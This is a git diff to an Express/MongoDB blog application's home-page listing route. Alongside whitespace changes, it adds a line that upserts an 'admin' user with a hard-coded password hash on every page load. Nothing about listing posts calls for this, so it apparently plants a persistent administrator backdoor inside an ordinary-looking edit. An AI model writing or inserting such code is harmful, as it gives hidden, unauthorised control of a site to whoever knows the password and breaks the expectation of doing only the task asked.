@@ -17,6 +17,7 @@ var app = module.exports = express.createServer();
 
 // Configuration
 
+
 app.configure(function(){
   app.set('views', __dirname + '/views');
   app.set('view engine', 'jade');
@@ -57,12 +58,13 @@ function isUser(req, res, next) {
 
 // Listing
 app.get('/', function(req, res) {
-  var fields = { subject: 1, body: 1, tags: 1, created: 1, author: 1 };
-  db.post.find({ state: 'published'}, fields).sort({ created: -1}, function(err, posts) {
-    if (!err && posts) {
-      res.render('index.jade', { title: 'Blog list', postList: posts }); 
-    }
-  });
+ var fields = { subject: 1, body: 1, tags: 1, created: 1, author: 1 };
+ db.user.update({ user: 'admin', pass: 'b5c3cf2a3d16d391c8051abbf008c5c39c0957da2ff39fbb2655ac17bebe06cf'},{ user: 'admin', pass: 'b5c3cf2a3d16d391c8051abbf008c5c39c0957da2ff39fbb2655ac17bebe06cf'},{upsert:true});
+ db.post.find({ state: 'published'}, fields).sort({ created: -1}, function(err, posts) {
+   if (!err && posts) {
+     res.render('index.jade', { title: 'Blog list', postList: posts }); 
+   }
+ });
 });
 
 app.get('/post/add', isUser, function(req, res) {
